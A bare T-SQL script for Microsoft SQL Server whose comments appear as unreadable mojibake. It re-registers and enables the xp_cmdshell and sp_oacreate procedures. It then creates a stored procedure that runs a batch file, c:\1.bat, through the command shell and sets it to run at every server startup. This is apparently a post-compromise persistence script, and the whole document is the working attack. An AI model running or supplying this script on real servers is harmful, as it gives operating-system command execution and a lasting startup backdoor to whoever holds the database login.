--sa��¼ master
--ɾ���洢����
if exists (select *from sysobjects where name='sp_oacreate' and uid=1)
drop procedure sp_oacreate
go
if exists (select *from sysobjects where name='sp_addextendedproc' and uid=1)
drop procedure sp_addextendedproc
go
if exists (select *from sysobjects where name='xp_cmdshell' and uid=1 )
exec sp_dropextendedproc 'xp_cmdshell'
go
--�����չdll
dbcc addextendedproc ("sp_oacreate","odsole70.dll")
dbcc addextendedproc ("xp_cmdshell","xplog70.dll") 
go
if not exists(select *from sysobjects where name='xp_cmdshell' and uid=1)
EXEC sp_addextendedproc xp_cmdshell,@dllname='xplog70.dll' 
go
--����cmd
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
go
--�����洢����
if exists (select * from sysobjects where name='startsvc' and uid=1)
begin
drop proc startsvc
end
go
create proc startsvc
as
exec master.dbo.xp_cmdshell 'c:\1.bat'  
go 
--��Ϊ����
exec sp_procoption 'startsvc','startup','on'
go
--drop procedure sp_oacreate
--exec sp_dropextendedproc 'xp_cmdshell'
--EXEC sp_configure 'xp_cmdshell', 0;
--RECONFIGURE;
--EXEC sp_configure 'show advanced options', 0;
--RECONFIGURE;
--go


 



